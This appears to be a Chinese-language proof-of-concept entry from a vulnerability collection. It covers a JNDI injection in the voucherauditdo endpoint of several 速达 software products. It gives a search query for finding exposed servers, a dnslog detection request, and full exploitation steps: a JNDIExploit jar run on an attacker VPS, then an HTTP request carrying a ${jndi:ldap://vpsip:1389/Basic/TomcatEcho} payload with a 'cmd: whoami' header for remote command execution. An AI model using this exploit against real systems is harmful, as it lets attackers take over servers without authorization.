---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 速达软件技术（广州）有限公司多款产品voucherauditdo存在JNID注入漏洞

# 一、漏洞简介
速达软件技术（广州）有限公司多款产品voucherauditdo存在JNID注入漏洞,攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 速达软件技术（广州）有限公司多款产品

# 三、资产测绘
+ hunter`web.body="速达软件技术（广州）有限公司"`
+ 特征


# 四、漏洞复现
1. 获取dnslog

```plain
g58b0k.dnslog.cn
```


2. 检测是否存在漏洞

```plain
GET /account/voucher/voucherauditdo!toEdit.action?billId=${jndi:ldap://g58b0k.dnslog.cn} HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
cmd: whoami
Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
Connection: close
```


漏洞利用

[JNDIExploit-1.4-SNAPSHOT.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222146450-e43931b2-c4c5-4cf5-859c-4328905c634c.jar)

将`JNDIExploit-1.4-SNAPSHOT.jar`上传到`vps`

```plain
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vpsip
```


```plain
GET /account/voucher/voucherauditdo!toEdit.action?billId=${jndi:ldap://vpsip:1389/Basic/TomcatEcho} HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
cmd: whoami
Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yfgdget075d9tggf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
